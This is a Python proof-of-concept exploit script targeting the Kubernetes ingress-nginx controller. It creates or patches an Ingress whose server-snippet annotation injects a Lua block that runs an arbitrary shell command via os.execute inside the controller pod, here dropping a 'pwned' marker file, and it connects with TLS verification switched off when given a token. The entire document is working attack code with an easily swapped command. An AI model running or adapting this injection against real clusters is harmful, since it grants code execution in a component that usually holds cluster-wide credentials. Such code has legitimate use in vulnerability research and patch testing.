import time
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# Config
NAMESPACE = "default"
DUMMY_SERVICE_NAME = "dummy"
TARGET_HOST = "rce-poc.local"
K8S_API_SERVER = None
K8S_API_TOKEN = None

def create_ingress_object(api):
    ingress_manifest = {
        "apiVersion": "networking.k8s.io/v1",
        "kind": "Ingress",
        "metadata": {
            "name": "exploit-ingress",
            "namespace": NAMESPACE,
            "annotations": {
                "nginx.ingress.kubernetes.io/server-snippet": '''
# Hijack ssl_certificate_by_lua_block logic
set_by_lua_block $hook {
  os.execute("touch /tmp/nginx/pwned_nginx")
  return ""
}
'''
            }
        },
        "spec": {
            "ingressClassName": "nginx",
            "rules": [
                {
                    "host": TARGET_HOST,
                    "http": {
                        "paths": [
                            {
                                "path": "/",
                                "pathType": "Prefix",
                                "backend": {
                                    "service": {
                                        "name": DUMMY_SERVICE_NAME,
                                        "port": {
                                            "number": 80
                                        }
                                    }
                                }
                            }
                        ]
                    }
                }
            ]
        }
    }

    try:
        api.create_namespaced_ingress(namespace=NAMESPACE, body=ingress_manifest)
        print("[+] Ingress created with Lua payload.")
    except ApiException as e:
        if e.status == 409:
            api.patch_namespaced_ingress(name="exploit-ingress", namespace=NAMESPACE, body=ingress_manifest)
            print("[+] Ingress updated with Lua payload.")
        else:
            print(f"[!] Ingress creation failed: {e}")

def main():
    if K8S_API_SERVER and K8S_API_TOKEN:
        configuration = client.Configuration()
        configuration.host = K8S_API_SERVER
        configuration.verify_ssl = False
        configuration.api_key = {"authorization": f"Bearer {K8S_API_TOKEN}"}
        client.Configuration.set_default(configuration)
    else:
        try:
            config.load_kube_config()
        except:
            config.load_incluster_config()

    api = client.NetworkingV1Api()

    print("[*] Applying malicious Ingress object...")
    create_ingress_object(api)
    print("[!] Done. Check for /tmp/nginx/pwned_nginx inside the ingress controller pod.")

if __name__ == "__main__":
    main()
